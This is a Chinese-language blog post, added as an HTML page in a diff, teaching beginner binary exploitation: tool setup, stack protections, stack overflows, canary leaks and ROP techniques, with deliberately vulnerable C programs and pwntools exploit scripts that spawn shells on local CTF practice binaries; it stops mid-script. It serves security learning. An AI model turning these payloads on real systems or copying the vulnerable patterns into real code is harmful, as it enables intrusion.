@@ -1,0 +1,814 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="逆向,pwn,linux,CTF," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="基本环境与工具测试与脚本均在linux下比较好。靶机使用docker可采用ubuntu16或者kali 需要的环境:linux的基本开发环境。12345678910//update是更新包信息，upgrade是更新软件。sudo apt-get update//工具sudo apt-get install gcc gdb git//32位libcsudo apt-get install libc6">
+<meta name="keywords" content="逆向,pwn,linux,CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn-入门1-基础与栈">
+<meta property="og:url" content="http://yoursite.com/2019/07/21/pwn-入门1-基础与栈/index.html">
+<meta property="og:site_name" content="GGWP">
+<meta property="og:description" content="基本环境与工具测试与脚本均在linux下比较好。靶机使用docker可采用ubuntu16或者kali 需要的环境:linux的基本开发环境。12345678910//update是更新包信息，upgrade是更新软件。sudo apt-get update//工具sudo apt-get install gcc gdb git//32位libcsudo apt-get install libc6">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-07-20T18:13:20.634Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="pwn-入门1-基础与栈">
+<meta name="twitter:description" content="基本环境与工具测试与脚本均在linux下比较好。靶机使用docker可采用ubuntu16或者kali 需要的环境:linux的基本开发环境。12345678910//update是更新包信息，upgrade是更新软件。sudo apt-get update//工具sudo apt-get install gcc gdb git//32位libcsudo apt-get install libc6">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"always","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/07/21/pwn-入门1-基础与栈/"/>
+
+
+
+
+
+  <title>pwn-入门1-基础与栈 | GGWP</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">GGWP</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/21/pwn-入门1-基础与栈/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="imbaya">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/1.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="GGWP">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">pwn-入门1-基础与栈</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-21T02:09:01+08:00">
+                2019-07-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="基本环境与工具"><a href="#基本环境与工具" class="headerlink" title="基本环境与工具"></a>基本环境与工具</h2><p>测试与脚本均在linux下比较好。靶机使用docker<br>可采用ubuntu16或者kali</p>
+<p>需要的环境:<br>linux的基本开发环境。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">//update是更新包信息，upgrade是更新软件。</div><div class="line">sudo apt-get update</div><div class="line">//工具</div><div class="line">sudo apt-get install gcc gdb git</div><div class="line">//32位libc</div><div class="line">sudo apt-get install libc6-dev-i386</div><div class="line">//python</div><div class="line">apt-get install python2.7 python-pip python-dev libssl-dev libffi-dev build-essential</div><div class="line">pip install --upgrade pip</div><div class="line">pip install --upgrade pwntools</div></pre></td></tr></table></figure></p>
+<p>gdb-peda:增强gdb功能。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/longld/peda.git ~/peda</div><div class="line">echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</div></pre></td></tr></table></figure></p>
+<p>checksec:检测可执行程序开启的保护。peda插件中含有，单独脚本也行。</p>
+<p>apt依赖错误就换下源，阿里的源好用些，ubuntu的太旧了</p>
+<p>WSL下还没折腾，暂时先用纯linux环境方便减少问题，开发就用vim，在linux下就不用图形ide了。</p>
+<a id="more"></a>
+<h2 id="前置必知"><a href="#前置必知" class="headerlink" title="前置必知"></a>前置必知</h2><h3 id="python2-7"><a href="#python2-7" class="headerlink" title="python2.7"></a>python2.7</h3><p>见博客-python速记</p>
+<h3 id="pwntool"><a href="#pwntool" class="headerlink" title="pwntool"></a>pwntool</h3><p><a href="https://pwntoolsdocinzh-cn.readthedocs.io/en/master/index.html#" target="_blank" rel="external">https://pwntoolsdocinzh-cn.readthedocs.io/en/master/index.html#</a><br>py库，pwn的工具</p>
+<h3 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h3><p><a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="external">https://github.com/lieanu/LibcSearcher</a><br>py库，用于根据libc中某函数的地址确定libc版本。linux下即使用ASLR保护，但是最低的12位不会变，因此可以确定。</p>
+<h3 id="gdb-peda"><a href="#gdb-peda" class="headerlink" title="gdb-peda"></a>gdb-peda</h3><h4 id="概观检测"><a href="#概观检测" class="headerlink" title="概观检测"></a>概观检测</h4><p>gdb 文件名:直接加载</p>
+<p>peda检查命令:<br>aslr:查看ASLR开关-aslr针对栈、堆、so的基地址随机化<br>checksec:检查二进制文件安全选项<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">CANARY    : 栈防护，在栈中传入值返回时检测</div><div class="line">FORTIFY   : 对数组大小的判断替换strcpy, memcpy, memset等函数</div><div class="line">NX        : 数据页不可执行</div><div class="line">PIE       : 地址随机化-针对可执行文件&amp;so</div><div class="line">RELRO     : 设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，防止got修改 Partial表示可以修改</div></pre></td></tr></table></figure></p>
+<p>vmmap查看内存映射信息。</p>
+<h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p>start :开始调试并停在入口<br>c:继续运行<br>r:重新开始运行</p>
+<p>n:步过<br>s:步入<br>fini:运行至函数结束</p>
+<p>断点:<br>b *0x地址:不写为当前<br>b 符号<br>info b:断点信息<br>delete num:删除断点</p>
+<p>内存断点:<br>watch 表达式:写中断<br>rwarch 表达式:读中断<br>awatch 表达式:读或写<br>表达式表示的内容就是监视内容，如*(int *)0x08044530 为监控该地址的int类型数据</p>
+<h4 id="查看数据"><a href="#查看数据" class="headerlink" title="查看数据"></a>查看数据</h4><p>stack n:查看栈数据<br>bt:查看栈帧<br>p $eax:查看寄存器-$表示取寄存器的值<br>vmmap:内存布局</p>
+<p>x /数量x(进制)g(输出格式) 地址</p>
+<h3 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h3><p>帮助寻找程序片段的工具，方便rop的利用。<br>–binary指定目标名。<br>–only搜索指定的汇编指令组合。<br>如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">--only &apos;pop|ret&apos; 执行pop ,ret的地址</div><div class="line">--only &apos;int&apos;  调用系统调用的地址</div></pre></td></tr></table></figure></p>
+<p> –string 搜索指定字串位置</p>
+<h2 id="Stack溢出"><a href="#Stack溢出" class="headerlink" title="Stack溢出"></a>Stack溢出</h2><h3 id="demo1-alloff"><a href="#demo1-alloff" class="headerlink" title="demo1-alloff"></a>demo1-alloff</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">CANARY    : disabled</div><div class="line">FORTIFY   : disabled</div><div class="line">NX        : ENABLED</div><div class="line">PIE       : disabled</div><div class="line">RELRO     : Partial</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">void success() &#123; puts(&quot;You Hava already controlled it.&quot;); &#125;</div><div class="line">void vulnerable() &#123;</div><div class="line">  char s[12];</div><div class="line">  gets(s);</div><div class="line">  puts(s);</div><div class="line">  return;</div><div class="line">&#125;</div><div class="line">int main(int argc, char **argv) &#123;</div><div class="line">  vulnerable();</div><div class="line">  return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>编译:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -m32 -fno-stack-protector -no-pie stack_example.c -o stack_example</div></pre></td></tr></table></figure></p>
+<p>结构<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">               +-----------------+</div><div class="line">               |     retaddr     |</div><div class="line">               +-----------------+</div><div class="line">               |     saved ebp   |</div><div class="line">        ebp---&gt;+-----------------+</div><div class="line">               |                 |</div><div class="line">               |                 |</div><div class="line">               |                 |</div><div class="line">               |                 |</div><div class="line">               |                 |</div><div class="line">               |                 |</div><div class="line">  s,ebp-0x14--&gt;+-----------------+</div><div class="line"></div><div class="line">gdb:</div><div class="line">0000| 0xffffcfb0 --&gt; 0xffffcfc4 (&quot;123456&quot;)</div><div class="line">0004| 0xffffcfb4 --&gt; 0xf7fb7000 --&gt; 0x1afdb0 </div><div class="line">0008| 0xffffcfb8 --&gt; 0xf7fb5244 --&gt; 0xf7e1f020 (call   0xf7f24289)</div><div class="line">0012| 0xffffcfbc --&gt; 0xf7e1f0ec (test   eax,eax)</div><div class="line">0016| 0xffffcfc0 --&gt; 0x1 </div><div class="line">0020| 0xffffcfc4 (&quot;123456&quot;)</div><div class="line">0024| 0xffffcfc8 --&gt; 0xf7003635 </div><div class="line">0028| 0xffffcfcc --&gt; 0x80484eb (&lt;__libc_csu_init+75&gt;:	add    edi,0x1)</div><div class="line">0032| 0xffffcfd0 --&gt; 0x1 </div><div class="line">0036| 0xffffcfd4 --&gt; 0xffffd094 --&gt; 0xffffd265 (&quot;/home/yao/destory/pwn/demo/stack1/stack_demo1&quot;)</div><div class="line">0040| 0xffffcfd8 --&gt; 0xffffcfe8 --&gt; 0x0 </div><div class="line">0044| 0xffffcfdc --&gt; 0x8048491 (&lt;main+22&gt;:	mov    eax,0x0)</div><div class="line">0048| 0xffffcfe0 --&gt; 0xf7fb73dc --&gt; 0xf7fb81e0 --&gt; 0x0 </div><div class="line">0052| 0xffffcfe4 --&gt; 0xffffd000 --&gt; 0x1 </div><div class="line">0056| 0xffffcfe8 --&gt; 0x0</div></pre></td></tr></table></figure></p>
+<p>一直跟着ebp链就行。ebp指向的是存父调用的ebp栈地址。因此跟着ebp链可以确定调用顺序。esp始终是栈的极限位置，ebp始终过程的栈区域开始。ebp指向的位置存的是上次的ebp值。再往上一个地址长度的地址为上次的esp值，其地址上内容为返回地址。</p>
+<p>exp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">#coding=utf8</div><div class="line">from pwn import *</div><div class="line"># 构造与程序交互的对象</div><div class="line">sh = process(&apos;./stack_demo1&apos;)</div><div class="line">success_addr = 0x0804843B</div><div class="line"># 构造payload</div><div class="line">payload = &apos;a&apos; * 0x14 + &apos;bbbb&apos; + p32(success_addr)</div><div class="line">print p32(success_addr)</div><div class="line"># 向程序发送字符串</div><div class="line">sh.sendline(payload)</div><div class="line"># 将代码交互转换为手工交互-用于操控shell</div><div class="line">sh.interactive()</div></pre></td></tr></table></figure></p>
+<p>栈溢出基本步骤<br>栈溢出危险函数:<br>gets scanf vscanf sprintf strcpy strcat bcopy<br>填充长度-直接使用ida分析，跟准ebp和esp即可。<br>主要目的是影响执行流程</p>
+<h3 id="demo-canary"><a href="#demo-canary" class="headerlink" title="demo-canary"></a>demo-canary</h3><p>canary保护在函数一开始向栈中加入数作为检测，返回时检测该数是否被修改。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">-fstack-protector gcc开启</div><div class="line"></div><div class="line">        High</div><div class="line">        Address |                 |</div><div class="line">                +-----------------+</div><div class="line">                | args            |</div><div class="line">                +-----------------+</div><div class="line">                | return address  |</div><div class="line">                +-----------------+</div><div class="line">        rbp =&gt;  | old ebp         |</div><div class="line">                +-----------------+</div><div class="line">      rbp-8 =&gt;  | canary value    |</div><div class="line">                +-----------------+</div><div class="line">                | 局部变量         |</div><div class="line">        Low     |                 |</div><div class="line">        Address</div></pre></td></tr></table></figure></p>
+<p>该值在linux下使用TLS(线程局部存储)中的随机数。</p>
+<p>绕过:<br>方法一<br>泄露栈中的Canary<br>需要合适的输出函数，溢出俩次<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">void getshell(void) &#123;</div><div class="line">    system(&quot;/bin/sh&quot;);</div><div class="line">&#125;</div><div class="line">void init() &#123;</div><div class="line">    setbuf(stdin, NULL);</div><div class="line">    setbuf(stdout, NULL);</div><div class="line">    setbuf(stderr, NULL);</div><div class="line">&#125;</div><div class="line">void vuln() &#123;</div><div class="line">    char buf[100];</div><div class="line">    for(int i=0;i&lt;2;i++)&#123;</div><div class="line">        read(0, buf, 0x200);</div><div class="line">        printf(buf);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">int main(void) &#123;</div><div class="line">    init();</div><div class="line">    puts(&quot;Hello Hacker!&quot;);</div><div class="line">    vuln();</div><div class="line">    return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">CANARY    : ENABLED</div><div class="line">FORTIFY   : disabled</div><div class="line">NX        : ENABLED</div><div class="line">PIE       : disabled</div><div class="line">RELRO     : Partial</div></pre></td></tr></table></figure></p>
+<p>exp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">#从二进制文件推断目标体系结构</div><div class="line">context.binary = &apos;ex2&apos;</div><div class="line"></div><div class="line">io = process(&apos;./ex2&apos;)</div><div class="line">#获取符号地址，并显示应用保护信息</div><div class="line">get_shell = ELF(&quot;./ex2&quot;).sym[&quot;getshell&quot;]</div><div class="line">#接受直到</div><div class="line">io.recvuntil(&quot;Hello Hacker!\n&quot;)</div><div class="line"></div><div class="line"># leak Canary</div><div class="line">payload = &quot;A&quot;*100</div><div class="line">io.sendline(payload)</div><div class="line"></div><div class="line">io.recvuntil(&quot;A&quot;*100)</div><div class="line"># 原程序中读取函数用的read，所以会读一个换行覆盖了用于保护canary的0x00，减去即可，因为小端结尾00在前</div><div class="line">Canary = u32(io.recv(4))-0xa</div><div class="line">log.info(&quot;Canary:&quot;+hex(Canary))</div><div class="line"></div><div class="line"># Bypass Canary</div><div class="line">payload = &quot;\x90&quot;*100+p32(Canary)+&quot;\x90&quot;*12+p32(get_shell)</div><div class="line">io.send(payload)</div><div class="line">#接受尽量多的数据</div><div class="line">io.recv()</div><div class="line"></div><div class="line">io.interactive()</div></pre></td></tr></table></figure></p>
+<p>注意canary的值是小端存储的，还有io.recv()时会读取上次溢出时输出返回读剩下的数据，因为抽象出的输出输入都是流。</p>
+<p>方法二:<br>one-by-one 爆破 Canary<br>每个线程的canary都不一样，但是fork后内存空间相同，可以使用爆破得到内存数据。</p>
+<p>方法三:<br>劫持stack_chk_fail，直接修改got即可</p>
+<p>方法四:<br>覆盖 TLS 中储存的 Canary 值 </p>
+<h3 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h3><p>主要为了针对NX保护，数据页不可执行，防止直接向栈与堆中注入代码。<br>核心思想利用已有片段控制执行流程。</p>
+<h4 id="demo1-ret2text"><a href="#demo1-ret2text" class="headerlink" title="demo1-ret2text"></a>demo1-ret2text</h4><p><a href="https://raw.githubusercontent.com/ctf-wiki/ctf-challenges/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text" target="_blank" rel="external">https://raw.githubusercontent.com/ctf-wiki/ctf-challenges/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text</a><br>直接返回到已有代码段利用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">CANARY    : disabled</div><div class="line">FORTIFY   : disabled</div><div class="line">NX        : ENABLED</div><div class="line">PIE       : disabled</div><div class="line">RELRO     : Partial</div></pre></td></tr></table></figure></p>
+<p>调试到gets，$ebp-$eax=6c,所以返回地址在gets缓存的上方0x70处。<br>目标直接定位到执行system(“/bin/sh”)的语句<br>exp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">sh=process(&apos;./ret2text&apos;)</div><div class="line">target=0x0804863A </div><div class="line">sh.sendline(&apos;A&apos;*0x70+p32(target))</div><div class="line">sh.interactive()</div></pre></td></tr></table></figure></p>
+<h4 id="demo2-ret2shellcode"><a href="#demo2-ret2shellcode" class="headerlink" title="demo2-ret2shellcode"></a>demo2-ret2shellcode</h4><p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode" target="_blank" rel="external">https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode</a><br>注入代码到内存中，之后返回利用<br>elf文件中标明不可执行的段实际加载后可能是能写的，在gdb中使用vmmap查看即可。<br>栈中可能受破坏，执行bss中的注入代码。<br>exp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">sh = process(&apos;./ret2shellcode&apos;)</div><div class="line"># asm使用汇编代码生成二进制，shellcraft生成获取shell的汇编代码(使用的execve)</div><div class="line">shellcode = asm(shellcraft.sh())</div><div class="line">buf2_addr = 0x804a080</div><div class="line"># ljust将原字串填充至指定长度</div><div class="line">sh.sendline(shellcode.ljust(112, &apos;A&apos;) + p32(buf2_addr))</div><div class="line">sh.interactive()</div></pre></td></tr></table></figure></p>
+<h4 id="demo3-ret2syscall"><a href="#demo3-ret2syscall" class="headerlink" title="demo3-ret2syscall"></a>demo3-ret2syscall</h4><p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop" target="_blank" rel="external">https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop</a><br>利用代码片段一点一点完成系统调用。<br>首先利用ROPgadget获得pop,ret这样可以利用栈修改寄存器的片段，与字串地址，之后全部放到栈中通过ret依次调用。<br>exp3:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">sh = process(&apos;./ret2syscall&apos;)</div><div class="line"></div><div class="line">pop_eax_ret = 0x080bb196</div><div class="line">pop_edx_ecx_ebx_ret = 0x0806eb90</div><div class="line">int_0x80 = 0x08049421</div><div class="line">binsh = 0x80be408</div><div class="line">//flat将字串、数字结合并转为字节模式，栈从下往上回</div><div class="line">payload = flat(</div><div class="line">    [&apos;A&apos; * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])</div><div class="line">sh.sendline(payload)</div><div class="line">sh.interactive()</div></pre></td></tr></table></figure></p>
+<h4 id="demo4-ret2libc"><a href="#demo4-ret2libc" class="headerlink" title="demo4-ret2libc"></a>demo4-ret2libc</h4><p>控制流程执行libc中的函数，通常是返回至某个函数的plt处或者具体位置。<br>三个例子<br>第一个-已有system与sh字串<br><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1" target="_blank" rel="external">https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1</a><br>直接在ida中找到system的plt，构建栈状态返回至system<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">sh = process(&apos;./ret2libc1&apos;)</div><div class="line"></div><div class="line">binsh_addr = 0x8048720</div><div class="line">system_plt = 0x08048460</div><div class="line">//正常状态下执行到system的plt是call之后的了。因此栈状态应该为下-上-返回地址-参数。</div><div class="line">payload = flat([&apos;a&apos; * 112, system_plt, &apos;b&apos; * 4, binsh_addr])</div><div class="line">sh.sendline(payload)</div><div class="line"></div><div class="line">sh.interactive()</div></pre></td></tr></table></figure></p>
+<p>第二个-有system无sh字串<br><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2" target="_blank" rel="external">https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2</a><br>需要自己用gets读到bss中，因为栈的地址不确定所以栈中不好放数据。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">sh = process(&apos;./ret2libc2&apos;)</div><div class="line">//使用模块中的plt执行其他模块函数-因为有延迟绑定不能用got，而且got上存的是地址数据。plt是直接可执行的。</div><div class="line">gets_plt = 0x08048460</div><div class="line">system_plt = 0x08048490</div><div class="line">pop_ebx = 0x0804843d</div><div class="line">buf2 = 0x804a080</div><div class="line">payload = flat(</div><div class="line">    [&apos;a&apos; * 112, 